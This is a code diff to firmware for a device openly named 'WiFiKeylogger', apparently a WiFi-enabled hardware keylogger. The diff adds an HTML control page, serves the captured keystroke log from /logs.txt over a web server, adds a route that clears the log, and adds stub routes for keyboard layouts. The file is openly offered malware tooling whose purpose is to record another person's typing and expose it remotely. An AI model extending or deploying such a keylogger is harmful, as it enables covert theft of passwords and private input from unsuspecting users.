@@ -27,6 +27,8 @@ String data;
 int tmp_incoming;
 char data2[20];
 
+const String MENU = "<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>";
+
 uint8_t _asciimap[256] =
 {
   0x00,             // NUL
@@ -310,18 +312,47 @@ void setup() {
 
   logs = SPIFFS.open("/logs.txt", "a+");
 
+  logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>");
+  
+
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-    request->send(SPIFFS, "/logs.txt", "text/plain");
+    request->send(SPIFFS, "/logs.txt", "text/html");
   });
 
   server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
     logs.close();
     logs = SPIFFS.open("/logs.txt", "w");
-    request->send(200, "text/plain", "file cleared!");
+    logs.println("<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>");
+    request->send(200, "text/plain", "file cleared!"); 
   });
 
   server.on("/configuration", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(200, "text/plain", "Configuration test");
+  });
+
+  server.on("/be", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap BE
+    request->send(200, "text/plain", "Keymap BE");
+  });
+
+  server.on("/cz", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap CZ
+    request->send(200, "text/plain", "Keymap CZ");
+  });
+
+  server.on("/da", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap DA
+    request->send(200, "text/plain", "Keymap DA");
+  });
+
+  server.on("/de", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap DE
+    request->send(200, "text/plain", "Keymap DE");
+  });
+
+  server.on("/en", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap ES
+    request->send(200, "text/plain", "Keymap EN");
   });
 
   server.on("/es", HTTP_GET, [](AsyncWebServerRequest *request){
@@ -329,9 +360,29 @@ void setup() {
     request->send(200, "text/plain", "Keymap ES");
   });
 
-  server.on("/en", HTTP_GET, [](AsyncWebServerRequest *request){
-    // Keymap ES
-    request->send(200, "text/plain", "Keymap EN");
+  server.on("/fi", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap FI
+    request->send(200, "text/plain", "Keymap FI");
+  });
+
+  server.on("/fr", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap FR
+    request->send(200, "text/plain", "Keymap FR");
+  });
+
+  server.on("/it", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap IT
+    request->send(200, "text/plain", "Keymap IT");
+  });
+
+  server.on("/pt", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap PT
+    request->send(200, "text/plain", "Keymap PT");
+  });
+
+  server.on("/tr", HTTP_GET, [](AsyncWebServerRequest *request){
+    // Keymap TR
+    request->send(200, "text/plain", "Keymap TR");
   });
   
   server.begin();
